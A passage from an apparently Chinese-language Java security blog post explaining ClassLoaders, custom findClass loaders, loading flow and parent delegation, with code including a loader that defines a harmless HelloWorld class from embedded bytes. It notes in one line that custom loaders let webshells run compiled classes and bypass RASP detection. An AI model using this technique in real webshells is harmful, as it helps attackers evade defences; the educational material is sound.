|--sun.misc.Launcher$ExtClassLoader@6f156508</span><br><span class="line">      |--<span class="literal">null</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><blockquote><ol><li><strong>基础类库</strong>: rt.jar：rt 代表“RunTime”，rt.jar是 Java 基础类库，包含 Java doc 里面看到的所有的类的类文件。也就是说，我们常用内置库 java.xxx.*都在里面，比如java.util.*、java.io.*、java.nio.*、java.lang.*、java.sql.<em>、java.math.</em></li><li><strong>模块加载器</strong>: Java 9 引入了模块系统，并且略微更改了上述的类加载器。扩展类加载器被改名为平台类加载器（platform class loader）。Java SE 中除了少数几个关键模块，比如说 java.base 是由启动类加载器加载之外，其他的模块均由平台类加载器所加载</li></ol></blockquote><h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ol><li><p>如果我们要自定义自己的类加载器，很明显需要继承ClassLoader抽象类，ClassLoader类有两个关键的方法可以使用<code>@Override</code>来自己实现</p><ol><li><code>protected Class loadClass(String name, boolean resolve)</code>: 加载指定二进制名称的类，实现了<strong>双亲委派机制</strong>。name 为类的二进制名称，resolve 如果为 true，在加载时调用 <strong>resolveClass(Class&lt;?&gt; c)</strong> 方法解析该类 –&gt; <strong>检查类是否已经加载，如果没有加载，则调用 findClass 方法来加载类</strong></li><li><code>protected Class findClass(String name)</code>: 根据类的二进制名称来查找类，默认实现是空方法 –&gt; <strong>在类没有被加载的情况下，是从特定的源（如文件系统、网络等）加载类的字节码，并将其转换为Class对象</strong></li></ol><blockquote><p>from 官方api<br>建议 ClassLoader的子类重写 findClass(String name)方法而不是loadClass(String name, boolean resolve) 方法。<br>实践建议：不想打破双亲委派模型就findClass覆写，想打破双亲委派模型则需要重写 loadClass() 方法</p></blockquote></li></ol><h4 id="自定义的例子"><a href="#自定义的例子" class="headerlink" title="自定义的例子"></a>自定义的例子</h4><blockquote><ol><li>例子一：某个类根本就不存在于我们的classpath，那么我们可以使用自定义类加载器重写findClass方法，然后在调用defineClass方法，来实现加载并调用方法</li><li>例子二: 利用自定义类加载器我们可以在webshell中实现加载并<strong>调用自己编译的类对象</strong>，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）</li></ol></blockquote><ol><li><p>详见<a href="https://www.javasec.org/javase/ClassLoader/#%E8%87%AA%E5%AE%9A%E4%B9%89classloader">这个章节</a></p></li><li><p>重写<code>findClass()</code>方法，从指定root读取类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pdai.jvm.classloader;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classData = loadClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] loadClassData(String className) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> root + File.separatorChar</span><br><span class="line">                + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">bufferSize</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[bufferSize];</span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((length = ins.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoot</span><span class="params">(String root)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line">        classLoader.setRoot(<span class="string">&quot;D:\\temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; testClass = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            testClass = classLoader.loadClass(<span class="string">&quot;com.pdai.jvm.classloader.Test2&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line">            System.out.println(object.getClass().getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>webshell自动加载类型</strong></em></p><ol><li>也是重写了<code>findClass()</code>方法，直接从字节码进行加载</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">testClass</span> <span class="operator">=</span> loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">testInstance</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取hello方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="ClassLoader的加载流程"><a href="#ClassLoader的加载流程" class="headerlink" title="ClassLoader的加载流程"></a>ClassLoader的加载流程</h2><blockquote><p>详细流程[<a href="https://pdai.tech/md/java/jvm/java-jvm-classload.html]">https://pdai.tech/md/java/jvm/java-jvm-classload.html]</a></p></blockquote><h3 id="加载方式"><a href="#加载方式" class="headerlink" title="加载方式"></a>加载方式</h3><ol><li><strong>类加载一般有三种方式</strong><ol><li>命令行启动应用时候由JVM初始化加载</li><li>通过Class.forName()方法动态加载</li><li>通过ClassLoader.loadClass()方法动态加载</li></ol></li><li>区别<ol><li>Class.forName(): 将类的.class文件加载到jvm中之外，还会对类进行解释，执行类中的static块 –&gt; Class.forName(name, initialize, loader)<strong>带参函数也可控制是否加载static块</strong>。并且只有调用了newInstance()方法采用调用构造函数，创建类的对象</li><li>ClassLoader.loadClass(): 只干一件事情，就是将.class文件加载到jvm中，<strong>不会执行static中的内容</strong>,只有在newInstance才会去执行static块。</li></ol></li></ol><h3 id="加载宏观理解"><a href="#加载宏观理解" class="headerlink" title="加载宏观理解"></a>加载宏观理解</h3><ol><li><em><strong>全局上加载干了3件事</strong></em><ol><li>通过一个类的全限定名来获取其定义的二进制字节流。</li><li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。</li><li>在Java堆中生成一个代表这个类的java.lang.Class对象，作为对方法区中这些数据的访问入口</li><li><img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/java%E5%8A%A0%E8%BD%BD%E5%AE%8F%E8%A7%82.png" alt="宏观加载"></li></ol></li></ol><h3 id="加载流程"><a href="#加载流程" class="headerlink" title="加载流程"></a>加载流程</h3><ol><li><p>源码部分详见<a href="https://www.javasec.org/javase/ClassLoader/#classloader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B">这个段落</a></p><ol><li>下面是jdk1.7u21中的实现</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">     <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">         <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">         <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);</span><br><span class="line">         <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                     c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     c = findBootstrapClassOrNull(name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                 <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                 <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                 <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                 <span class="comment">// to find the class.</span></span><br><span class="line">                 <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                 c = findClass(name);</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">             resolveClass(c);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> c;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>类加载器并不需要等到某个类被“首次主动使用”时再加载它，而是允许进行预料</strong>，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它 –&gt; <strong>但是用到有问题才会报道</strong>: 如果在预先加载的过程中遇到了.class文件缺失或存在错误，类加载器必须在程序首次主动使用该类时才报告错误(LinkageError错误)如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误。</p></li><li><p><strong>简要说明以下，以缩进作为顺序的层次</strong></p><ol><li><code>loadClass()</code>检查是否已经加载过<ol><li>如果没有找到，检查parent，以下步骤一直递归进行<ol><li>parent!&#x3D;null，调用parent的loadClass</li><li>parent&#x3D;&#x3D;null，调用Bootstrap ClassLoader</li></ol></li><li>如果找到也继续往下走</li><li>判断是否找到<ol><li>如果没有找到，调用<code>findClass()</code>，默认没有重写，直接返回类加载失败异常，如果有重写，一般会findClass()内部再实现<code>defineClass()</code></li><li>如果找到了继续</li></ol></li><li>判断是否有<code>resolve</code>如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false</li></ol></li></ol></li></ol><h3 id="双亲委托模型"><a href="#双亲委托模型" class="headerlink" title="双亲委托模型"></a>双亲委托模型</h3><blockquote><p>源码的话见上述的“加载流程”中有</p></blockquote><ol><li><p><strong>双亲委托模型</strong>：这一模型的核心思想是——当一个类加载器接收到类加载请求时，它首先不会自己尝试加载这个类，而是<strong>优先将这个请求委派给它的父类加载器去处理</strong>。只有当父类加载器无法加载该类时，当前类加载器才会尝试自己去加载</p><ol><li><p>有张图就是好理解<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B.png" alt="pic"></p></li><li><p><strong>非强制性</strong>: 双亲委派模型并不是一种强制性的约束，只是 JDK 官方推荐的一种方式。如果我们因为某些特殊需求想要打破双亲委派模型，也是可以的</p></li><li><p><strong>组合代替继承</strong>: 类加载器之间的父子关系一般不是以继承的关系来实现的，而是通常使用组合关系来复用父加载器的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 组合</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>双亲委派机制过程？ –&gt; 